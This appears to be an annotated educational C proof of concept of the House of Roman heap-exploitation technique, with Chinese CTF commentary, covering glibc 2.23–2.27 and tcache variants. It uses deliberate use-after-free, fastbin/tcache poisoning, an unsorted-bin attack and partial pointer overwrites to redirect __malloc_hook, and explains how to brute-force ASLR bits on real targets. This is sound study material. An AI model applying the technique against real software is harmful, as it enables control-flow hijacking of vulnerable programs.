/*
 * 中文导读（CTF 版）
 *
 * 手法：house_of_roman
 * 文件标注范围：2.23 ~ 2.27
 * 模拟漏洞：无泄露场景下的 UAF/堆溢出，可做 fastbin 与 unsorted 相对覆盖。
 * 核心流程：组合 fastbin attack、unsorted bin attack 和低字节猜测，把分配导向 __malloc_hook 并写 one-gadget。
 * 版本分支：2.23~2.25 没有 tcache；2.26~2.27 显式填满/清空 0x70、0x90 tcache，
 * 使关键 free/malloc 仍进入 fastbin 与 unsorted bin。
 * 成功判据：最后 __malloc_hook 被设为 _exit，malloc(0) 必须直接退出 0；
 * 2.28 的 bdc3009 在 unsorted 摘链前检查 bck->fd==victim，本链第 2 步失效。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#define _GNU_SOURCE     /* 启用 RTLD_NEXT 等 GNU 扩展定义。 */
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <malloc.h>
#include <dlfcn.h>
#include <unistd.h>
#include <gnu/libc-version.h>

/*
 * 上游作者曾在 Ubuntu 16.04 的 glibc 2.23、2.24，以及 Ubuntu 17.04
 * 的 glibc 2.25 上测试本手法。这里进一步补上了 2.26~2.27 的 tcache
 * 分支，并由本项目的逐版本容器矩阵验证。
 *
 * PIE 编译示例：gcc -fPIE -pie house_of_roman.c -o house_of_roman
 * 原始 PoC 作者：Maxwell Dulin（Strikeout）。
 */

// 关闭标准输入输出缓冲，防止 stdio 的首次堆分配改变精心设计的堆地址低字节。
void* init(){
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
}

int main(){
	/* glibc 2.26 引入 tcache。这里只区分本 PoC 覆盖的两类分配器；
	 * 真题中应根据附件 libc 和 GLIBC_TUNABLES 确认 tcache 是否启用。
	 */
	const char *version = gnu_get_libc_version();
	const char *minor_text = strchr(version, '.');
	int minor = minor_text ? atoi(minor_text + 1) : 0;
	int has_tcache = (minor >= 26);
	void *tc70[7] = {0};
	void *tc90[7] = {0};
	/* 这两个符号只是 PoC 的成功 oracle，不是泄漏原语。
	 * 在开始堆风水前一次性解析，避免 dlsym 的内部分配扰动关键链。
	 */
	long long malloc_hook_addr = (long long)dlsym(RTLD_NEXT, "__malloc_hook");
	long long exit_addr = (long long)dlsym(RTLD_NEXT, "_exit");
	if (malloc_hook_addr == 0 || exit_addr == 0)
		return 1;

	/*
	 * House of Roman 的目标是在没有地址泄漏的情况下完成 libc 控制流劫持。
	 * 它不恢复完整指针，而是利用同一映射内高位相同这一事实，只覆盖已有堆
	 * 指针或 libc 指针的低一至数个字节，把它移动到相邻目标。
	 *
	 * 攻击分三段：先构造“受害块 -> 含 libc 指针的块”链，把链尾相对覆盖到
	 * __malloc_hook 附近；再修改 unsorted victim 的 bk，对 hook 执行
	 * unsorted-bin 写入，使那里得到 main_arena 附近的确定 libc 指针；最后
	 * 相对覆盖该指针到 one-gadget、system，或本例使用的 _exit。
	 *
	 * 总计约 12 位未知 ASLR 低位需要爆破，理论单次成功率约 1/4096。为了让
	 * 回归稳定，本 PoC 从真实符号地址算出正确字节；真题无泄漏时必须逐次猜测。
	 *
	 * 原始文章：
	 * https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions
	 *
	 * 所需漏洞原语是：通过 UAF 或堆溢出修改 fastbin/tcache 单链指针和
	 * unsorted-bin 双链指针，并能较精确地控制 malloc/free 的尺寸与顺序。
	 */

	char* introduction = "\nWelcome to the House of Roman\n\n"
			     "This is a heap exploitation technique that is LEAKLESS.\n"
			     "There are three stages to the attack: \n\n"
			     "1. Point a fastbin chunk to __malloc_hook.\n"
			     "2. Run the unsorted_bin attack on __malloc_hook.\n"
			     "3. Relative overwrite on main_arena at __malloc_hook.\n\n"
			     "All of the stuff mentioned above is done using two main concepts:\n"
                             "relative overwrites and heap feng shui.\n\n"
			     "However, this technique comes at a cost:\n"
                             "12-bits of entropy need to be brute forced.\n"
			     "That means this technique only work 1 out of every 4096 tries or 0.02%.\n"
			     "**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n";
	
	init();

	/*
	 * 第一阶段：让 0x70 单链最终指向 __malloc_hook。
	 *
	 * 先通过堆风水让一个可 UAF 的链头指向另一个堆块；第二个堆块用户区又
	 * 保存着 unsorted bin 留下的 main_arena 指针。于是只改链头指针最低
	 * 字节，就能把它从原相邻块挪到“含 libc 指针的块”；再改 libc 指针的
	 * 低两字节，即可把链尾挪到 __malloc_hook 附近。
	 *
	 * 获得“物理尺寸 0x70、用户区含 libc 指针”的块通常有两种方法：从
	 * small/large/unsorted bin 中较大块切割，或把旧块 size 覆盖成 0x71。
	 * 本例选择切割，因为它要求的额外漏洞能力更少。
	 */

	// 该块释放后仍会被写入，模拟 UAF；其 next/fd 将被改到含 libc 指针的块。
	uint8_t* fastbin_victim = malloc(0x60); 

	// 分配 0x90 物理尺寸的对齐垫块，使后续两个关键地址仅最低字节不同；
	// 因此堆内相对跳转只需单字节覆盖，不必额外爆破堆地址的半字节。
	malloc(0x80);

	// 相对第一个块偏移 0x100：释放后其 fd/bk 会保存 main_arena 附近指针。
	uint8_t* main_arena_use = malloc(0x80);
	
	// 相对第一个块偏移 0x190：先作为正常链后继，随后被低字节覆盖替换掉。
	uint8_t* relative_offset_heap = malloc(0x60);

	/* 2.26~2.27：先把 0x90 tcache 填满，使 main_arena_use 进入 unsorted。
	 * 0x70 filler 先保持 allocated；稍后只 free 一个，用来把
	 * tcache count 布置为 3。filler 都在四个关键 chunk 之后，
	 * 不改变它们之间的低字节关系。
	 */
	if (has_tcache) {
		for (int i = 0; i < 7; i++) {
			tc70[i] = malloc(0x60);  // 请求 0x60，对应物理 chunk size 0x70。
			tc90[i] = malloc(0x80);  // 请求 0x80，对应物理 chunk size 0x90。
		}
		for (int i = 0; i < 7; i++)
			free(tc90[i]);
	}
	
	// 0x90 tcache 已满，该块会进入 unsorted bin；其 fd 与 bk 都会写入 main_arena 附近地址。
	free(main_arena_use);

	/*
	 * 从刚释放的 0x90 unsorted chunk 前部切出请求大小 0x60 的块。它的用户区
	 * 继承了原 fd/bk，因而含 main_arena 指针；物理尺寸同时恰好是 0x70。
	 * 必须选择该尺寸，是因为 __malloc_hook 附近用于伪造的 size 字节通常形如
	 * 0x7f，掩掉标志位后要与 0x70 fastbin 的索引检查相符。
	 */

	// 返回块位于相对偏移 0x100，用户区前两个机器字仍含 main_arena 附近地址。
	uint8_t* fake_libc_chunk = malloc(0x60);

	// 注意：下面的地址差值输出只用于测试判据，并不属于无泄漏攻击本身。
	/* 原始 PoC 用 `main_arena+0x58 - 0xe8` 推导 __malloc_hook，该差值并不是
	 * 跨版本 ABI；在 2.27 已变化。教学回归用导出符号地址作 oracle，只是
	 * 避免把某个 Ubuntu Build ID 的偏移写死成“glibc 版本常量”。
	 * 真题仍要从附件 libc 符号/反汇编提取 `main_arena 泄漏点 -> hook`
	 * 的差值，然后用同样的低字节猜测写入。
	 */
	printf("[i] arena→hook 差值=%#llx\n",
	       malloc_hook_addr - ((long long *)fake_libc_chunk)[0]);

	// 先放入真实后继，后面才能只修改已有指针的最低字节，而不必伪造未知高位。
	// 释放 relative_offset_heap 后，它会成为随后释放的 fastbin_victim 的 next/fd。
	/* 2.26~2.27 不再强行复制旧 fastbin 链。若 tcache 为空，先 free
	 * 一个 filler，再 free relative/victim，可得 count=3 且
	 * entries: victim -> relative -> filler。随后相对覆盖把中间改为
	 * victim -> fake_libc_chunk -> hook，这正是 tcache 版 Roman 的第 1 步。
	 */
	if (has_tcache)
		free(tc70[0]);
	free(relative_offset_heap);	

	/*
	 * 释放 fastbin_victim 后仍保留其指针，模拟 UAF。此刻它的 next/fd 正常
	 * 指向相对偏移 0x190 的 relative_offset_heap，下一步只改最低字节。
	 */
	free(fastbin_victim);

	/*
	 * 开始相对覆盖前，关键堆布局如下；左侧数字是相对 fastbin_victim 的偏移：
	 * 0x000：fastbin_victim，物理尺寸 0x70；
	 * 0x070：alignment_filler，物理尺寸 0x90；
	 * 0x100：fake_libc_chunk，物理尺寸 0x70；
	 * 0x170：切割余块 leftover_main，物理尺寸 0x20；
	 * 0x190：relative_offset_heap，物理尺寸 0x70。
	 *
	 * 初始单链为 fastbin_victim -> relative_offset_heap，余块仍在 unsorted。
	 * 真实后继位于 0x190，目标块位于 0x100，只把末字节从 0x90 改为 0x00
	 * 就能得到 fastbin_victim -> fake_libc_chunk -> main_arena 附近地址。
	 * 第二条边正是 fake_libc_chunk 先前经历 unsorted bin 后遗留的 fd。
	 */

	/* fastbin fd 保存 chunk header，故旧路径要指向 fake_libc_chunk-0x10，
	 * 本排布下低字节为 0x00；tcache next 保存 user pointer，
	 * 2.26~2.27 则直接取 fake_libc_chunk 的低字节。
	 */
	fastbin_victim[0] = has_tcache
	                    ? ((uintptr_t)fake_libc_chunk & 0xff)
	                    : (((uintptr_t)fake_libc_chunk - 0x10) & 0xff);

	/*
	 * 当前 0x70 单链为 fastbin_victim -> fake_libc_chunk -> main_arena
	 * 附近地址。接下来把 fake_libc_chunk 中该 libc 指针的低两字节改到
	 * __malloc_hook 前方，使分配器返回一个能覆盖函数指针的伪块。
	 *
	 * hook 邻近位置必须同时伪装出与 0x70 bin 匹配的 size。经典做法利用
	 * __memalign_hook 周围的零字节和常见的 0x7f 地址尾部，选择非对齐伪
	 * chunk header。目标页内低 12 位由具体 libc 固定，再高 4 位受 ASLR
	 * 影响，故无泄漏场景要在 16 种可能中爆破；目标偏移也必须按附件 libc
	 * 的实际布局计算，不能把一个版本的常量照搬到另一个版本。
	 *
	 * 旧 fastbin 路径覆盖后为：
	 * 链表形态：fastbin_victim -> fake_libc_chunk -> (__malloc_hook - 0x23)。
	 */
	
	/*
	 * 对遗留的 main_arena 指针做相对覆盖，使其指向 __malloc_hook 附近且
	 * size 合法的位置。为让教学回归稳定，本 PoC 根据真实符号地址直接算出
	 * 正确字节；无泄漏真题只能按目标 libc 的固定页内偏移设置已知位，并对
	 * 受 ASLR 影响的位逐次爆破。
	 */

	/* 旧 fastbin 保存 chunk header 指针，malloc 返回时再 +0x10，故用 hook-0x23。
	 * 2.26~2.27 tcache 直接保存 user pointer，改用 hook-0x13。两条路径都使
	 * malloc_hook_chunk[19] 恰好落在 __malloc_hook。
	 */
	long long __malloc_hook_adjust = malloc_hook_addr - (has_tcache ? 0x13 : 0x23);

	// 取目标地址的低两个字节，模拟一次最多覆盖两字节的相对写。
	int8_t byte1 = (__malloc_hook_adjust) & 0xff; 	
	int8_t byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
	fake_libc_chunk[0] = byte1; // 写地址最低 8 位；同一页内这部分由目标偏移确定。
	fake_libc_chunk[1] = byte2; // 写次低 8 位；受 ASLR 影响的高半字节真题中要爆破。

	// 目标伪块之前还有 fastbin_victim 与 fake_libc_chunk 两个链节点，所以先取两次。
	/* 2.23~2.25 沿 fastbin 取三次；2.26~2.27 沿 count=3 的 tcache 取三次。 */
	malloc(0x60);
	malloc(0x60);

	// 若前述 4 位猜错，本次取链会因伪块 size 与 bin 不匹配而崩溃；成功才进入第二阶段。
	uint8_t* malloc_hook_chunk = malloc(0x60);	

	/*
	 * 第二阶段：对 __malloc_hook 发起 unsorted-bin attack。
	 *
	 * 第一阶段只让 malloc 返回了覆盖 hook 的堆块，攻击者仍不知道任意 libc
	 * 函数的完整地址。这里修改 unsorted victim 的 bk，使摘链语句
	 * bck->fd = unsorted_chunks(av) 把 main_arena 附近地址写进 hook。
	 * 原理可对照：
	 * https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c
	 *
	 * hook 中有真实 libc 指针后，再相对覆盖其低字节即可移到 one-gadget 或
	 * 其他回调。最后跳转还需猜约 8 位；连同第一阶段的 4 位，总计约 12 位
	 * 随机性，单次成功率约 1/4096。
	 */

	// 取得待破坏的 0x90 块，并在其后分配保护块，避免释放时与 top 合并。
	/* 初始 0x90 tcache 仍是满的；先取空，避免 unsorted_bin_ptr 只是从 tcache 取出的旧块。 */
	if (has_tcache)
		for (int i = 0; i < 7; i++)
			tc90[i] = malloc(0x80);
	uint8_t* unsorted_bin_ptr = malloc(0x80);	
	malloc(0x30); // 保护块保持已分配状态，隔开受害块与 top。

	/* 重新填满 0x90 tcache，使关键 free 越过 tcache 进入 unsorted。 */
	if (has_tcache)
		for (int i = 0; i < 7; i++)
			free(tc90[i]);
	// 释放后仍通过旧指针改写其 bk，模拟 UAF 原语。
	free(unsorted_bin_ptr);

	/*
	 * byte2 的高 4 位在真实无泄漏利用中应复用第一阶段的爆破结果；为保证示例
	 * 稳定，这里仍由真实地址动态计算。bk 要设置为目标地址减 0x10，因为最终
	 * 写入位置是 bck->fd，即伪 chunk 基址加 fd 字段偏移 0x10。
	 */
	__malloc_hook_adjust = malloc_hook_addr - 0x10;
	byte1 = (__malloc_hook_adjust) & 0xff; 	
	byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 

	// 再做一次低两字节相对覆盖，把 unsorted victim 的 bk 移到 __malloc_hook-0x10。
	// 所需 libc 半字节已由第一阶段猜出，因此两个阶段并非各自独立爆破同一部分。
	unsorted_bin_ptr[8] = byte1; // 覆盖 bk 的最低字节。

	// 次低字节中的随机半字节真题中必须爆破；示例直接填写正确值以便稳定回归。
	unsorted_bin_ptr[9] = byte2; // 其另一半由目标页内偏移固定，可由附件 libc 预先计算。
	
	/*
	 * 触发摘链后，分配器会向 bk+0x10 写入 main_arena 附近地址。经典链会同时
	 * 破坏 unsorted-bin 表头，连带使后续 small/large-bin 操作不再安全，故
	 * 实战中应在控制流劫持前避免再走这些 bin。请求尺寸还必须与 victim 匹配，
	 * 让 victim 在写入后立即作为精确尺寸块返回；若继续遍历已破坏链表，进程
	 * 通常会在接下来的完整性检查中崩溃。
	 */

	/* 2.26~2.27 的 malloc 前端会先从 tcache 取块；若把 tcache 取空，
	 * `_int_malloc` 又会把这块 exact-size unsorted victim 塞回 tcache，
	 * 继续扫描已被 attack 破坏的 unsorted head 而崩溃。
	 * `calloc` 不走 malloc 的 tcache-get 快速路径；同时保持 0x90 tcache
	 * 为满，会使 exact-size victim 在完成 bck->fd 写后直接返回。
	 */
	if (has_tcache)
		calloc(1, 0x80);
	else
		malloc(0x80);

	/* 旧示例把 hook 指到 system("/bin/sh")，shell 在无交互 CI 中立即退出，
	 * 即使没有清晰成功判据也可能让 main 返回 0。这里改用 libc 内的 _exit：
	 * hook 真被消费时 malloc(0) 直接令进程 exit(0)；若 malloc 意外返回，
	 * 下方强制 exit(1)，从而消除假阳性。_exit 与 main_arena 同属 libc，
	 * 仍满足本链只相对覆盖低 4 字节的前提。
	 */
	/*
	 * 第三阶段：把 __malloc_hook 改成一个可观察的 libc 回调。
	 * malloc_hook_chunk 的用户区起点位于 hook 前 19 字节，所以从索引 19
	 * 开始覆盖第二阶段写入的 main_arena 指针。具体 glibc 内页偏移决定最低
	 * 12 位，后续约 12 位受 ASLR 影响；本示例填写已解析的 _exit 地址低位，
	 * 真正无泄漏攻击则要把未知位纳入爆破。
	 */

	malloc_hook_chunk[19] = exit_addr & 0xff; // 最低字节是目标 glibc 内固定的页内偏移。

	malloc_hook_chunk[20] = (exit_addr >> 8) & 0xff;  // 其中随机半字节沿用前面已猜中的 libc 基址位。
	malloc_hook_chunk[21] = (exit_addr >> 16) & 0xff; // 再覆盖一个随机字节，完成主要相对跳转。
	malloc_hook_chunk[22] = (exit_addr >> 24) & 0xff; // 数据段与代码段跨度大时还需此字节，保守起见一并写入。

	puts("[i] 触发 __malloc_hook");
	malloc(0);

	/* 只有 hook 没被调用时才会到这里。 */
	_exit(1);
		
}
